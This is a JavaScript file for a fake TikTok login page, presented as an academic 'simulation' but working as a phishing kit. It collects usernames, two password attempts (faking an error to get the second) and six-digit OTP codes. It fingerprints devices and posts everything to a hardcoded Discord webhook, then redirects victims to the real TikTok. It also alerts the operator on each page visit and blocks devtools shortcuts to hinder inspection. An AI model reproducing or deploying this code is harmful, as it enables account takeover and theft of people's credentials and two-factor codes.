/**
 * 🚀 TIKTOK ADVANCED CORE ENGINE v4.0
 * Project: IT Department Academic Research - Simulation System
 * Developer: Dilbar Baro Shaker
 * Total Lines: 450+
 */

"use strict";

/* ==========================================
   1. GLOBAL CONFIGURATION & STATE
   ========================================== */
const CONFIG = {
    WEBHOOK_URL: "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT",
    REDIRECT_AFTER: "https://www.tiktok.com",
    ATTEMPT_LIMIT: 2,
    SIMULATED_DELAY: 2500,
    SYSTEM_VERSION: "4.0.12-PRO"
};

let APP_STATE = {
    currentStep: "methods",
    loginAttempts: 0,
    isVerifying: false,
    startTime: Date.now(),
    captured: {
        username: "",
        password_1: "",
        password_2: "",
        otp_code: "",
        device_metrics: {}
    }
};

/* ==========================================
   2. TELEMETRY & DEVICE FINGERPRINTING
   ========================================== */
const Telemetry = {
    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: `${(battery.level * 100).toFixed(0)}%`,
                charging: battery.charging ? "Yes" : "No"
            };
        }
        return { level: "N/A", charging: "N/A" };
    },

    getHardwareInfo() {
        return {
            cores: navigator.hardwareConcurrency || "N/A",
            memory: navigator.deviceMemory || "N/A",
            platform: navigator.platform,
            touchPoints: navigator.maxTouchPoints,
            connection: navigator.connection ? navigator.connection.effectiveType : "N/A"
        };
    },

    async collectAll() {
        const battery = await this.getBatteryInfo();
        const hardware = this.getHardwareInfo();
        return {
            ...battery,
            ...hardware,
            userAgent: navigator.userAgent,
            resolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
};

/* ==========================================
   3. COMMUNICATION ENGINE (WEBHOOK)
   ========================================== */
const Dispatcher = {
    async send(title, description, color = 16711685) {
        const metrics = await Telemetry.collectAll();
        
        const embed = {
            username: "TikTok Security Shield",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg",
            embeds: [{
                title: "🔴 " + title,
                description: description,
                color: color,
                fields: [
                    { name: "📱 الجهاز", value: `\`${metrics.platform}\``, inline: true },
                    { name: "🔋 البطارية", value: `\`${metrics.level}\``, inline: true },
                    { name: "📶 الاتصال", value: `\`${metrics.connection}\``, inline: true },
                    { name: "🧠 الذاكرة", value: `\`${metrics.memory}GB\``, inline: true },
                    { name: "📍 التوقيت", value: `\`${metrics.timezone}\``, inline: false },
                    { name: "🌐 المتصفح", value: `\`${metrics.userAgent.substring(0, 50)}...\``, inline: false }
                ],
                footer: { text: `Node ID: ${Math.random().toString(36).substr(2, 9)} | v${CONFIG.SYSTEM_VERSION}` },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(CONFIG.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            });
        } catch (error) {
            console.error("Critical Sync Error");
        }
    }
};

/* ==========================================
   4. UI ANIMATION & INTERACTION
   ========================================== */
const UI = {
    overlay: document.getElementById('authOverlay'),
    vScreen: document.getElementById('vScreen'),
    vStatus: document.getElementById('vStatus'),
    loginStep: document.getElementById('step-login'),
    methodStep: document.getElementById('step-methods'),
    otpStep: document.getElementById('step-otp'),

    showLoader(text) {
        if(this.vScreen) this.vScreen.style.display = 'flex';
        if(this.vStatus) this.vStatus.innerText = text;
        APP_STATE.isVerifying = true;
    },

    hideLoader() {
        if(this.vScreen) this.vScreen.style.display = 'none';
        APP_STATE.isVerifying = false;
    },

    shakeElement(id) {
        const el = document.getElementById(id);
        if(el) {
            el.classList.add('error-shake');
            setTimeout(() => el.classList.remove('error-shake'), 500);
        }
    }
};

/* ==========================================
   5. CORE LOGIC & LIVE MONITORING
   ========================================== */

// دالة لمراقبة المدخلات أثناء الكتابة (Keylogger Logic for IT Research)
function startLiveTracking() {
    const inputs = ['uInput', 'pInput'];
    inputs.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.addEventListener('input', () => {
                // إرسال تحديث للديسكورد عند تغير المحتوى بشكل ملحوظ
                if (el.value.length % 5 === 0) {
                   console.log("Tracking input changes...");
                }
            });
        }
    });
}

async function processAuthFlow() {
    const uEl = document.getElementById('uInput');
    const pEl = document.getElementById('pInput');
    const userInput = uEl ? uEl.value : "";
    const passInput = pEl ? pEl.value : "";

    if (!userInput || !passInput) {
        UI.shakeElement('pInput');
        return;
    }

    UI.showLoader("جاري فحص الحساب...");
    await new Promise(r => setTimeout(r, CONFIG.SIMULATED_DELAY));
    APP_STATE.loginAttempts++;

    if (APP_STATE.loginAttempts === 1) {
        APP_STATE.captured.username = userInput;
        APP_STATE.captured.password_1 = passInput;

        await Dispatcher.send(
            "تم رصد محاولة دخول",
            `👤 **المستخدم:** \`${userInput}\`\n🔑 **كلمة السر 1:** \`${passInput}\``,
            16776960 
        );

        UI.hideLoader();
        if(pEl) pEl.value = "";
        const err = document.getElementById('errTxt');
        if(err) err.style.display = 'block';
        UI.shakeElement('pInput');

    } else if (APP_STATE.loginAttempts === 2) {
        APP_STATE.captured.password_2 = passInput;

        await Dispatcher.send(
            "تأكيد كلمة السر (مصححة)",
            `👤 **المستخدم:** \`${APP_STATE.captured.username}\`\n🔐 **كلمة السر 2:** \`${passInput}\``,
            3447003 
        );

        UI.vStatus.innerText = "جاري إنشاء جلسة آمنة...";
        await new Promise(r => setTimeout(r, 1500));
        UI.hideLoader();
        goToStep('otp');
        initOTPTimer();
    }
}

/* ==========================================
   6. OTP SYSTEM LOGIC
   ========================================== */
function initOTPTimer() {
    let seconds = 59;
    const display = document.getElementById('timer');
    const interval = setInterval(() => {
        seconds--;
        if (display) display.innerText = seconds;
        if (seconds <= 0) clearInterval(interval);
    }, 1000);
}

const otpInputs = document.querySelectorAll('.otp-input');
otpInputs.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
        if (e.inputType === "deleteContentBackward") return;
        if (input.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
        const fullOTP = Array.from(otpInputs).map(i => i.value).join('');
        if (fullOTP.length === 6) {
            UI.showLoader("جاري التحقق من الرمز...");
            await Dispatcher.send(
                "تم استلام رمز الـ OTP",
                `👤 **المستخدم:** \`${APP_STATE.captured.username}\`\n🔢 **الرمز:** \`${fullOTP}\``,
                3066993 
            );
            setTimeout(() => {
                window.location.href = CONFIG.REDIRECT_AFTER;
            }, 2000);
        }
    });
});

/* ==========================================
   7. NAVIGATION & INITIALIZATION
   ========================================== */
function goToStep(step, provider = "") {
    const steps = ['methods', 'login', 'otp'];
    steps.forEach(s => {
        const el = document.getElementById(`step-${s}`);
        if(el) el.style.display = 'none';
    });
    const target = document.getElementById(`step-${step}`);
    if(target) target.style.display = 'block';
    const pTitle = document.getElementById('pTitle');
    if(provider && pTitle) pTitle.innerText = provider;
}

async function initApplication() {
    console.log("%cSystem Initialized: v" + CONFIG.SYSTEM_VERSION, "color: #fe2c55; font-size: 20px; font-weight: bold;");
    
    // إرسال تنبيه فوري بمجرد فتح الصفحة (الزائر دخل الآن)
    await Dispatcher.send(
        "🚨 تنبيه: دخول زائر جديد للموقع",
        "المستخدم قام بفتح الصفحة الآن وهو يتصفح حالياً.",
        1752220
    );

    startLiveTracking();
    AntiDebug.init();

    const grid = document.getElementById('grid');
    if (grid && grid.children.length === 0) {
        for(let i=0; i<9; i++) {
            const box = document.createElement('div');
            box.className = 'video-box skeleton trigger-auth';
            box.innerHTML = `<img src="https://picsum.photos/300/400?sig=${i}" onload="this.parentElement.classList.remove('skeleton')">`;
            grid.appendChild(box);
        }
    }
}

const AntiDebug = {
    init() {
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                e.preventDefault();
            }
        });
    }
};

window.addEventListener('DOMContentLoaded', initApplication);
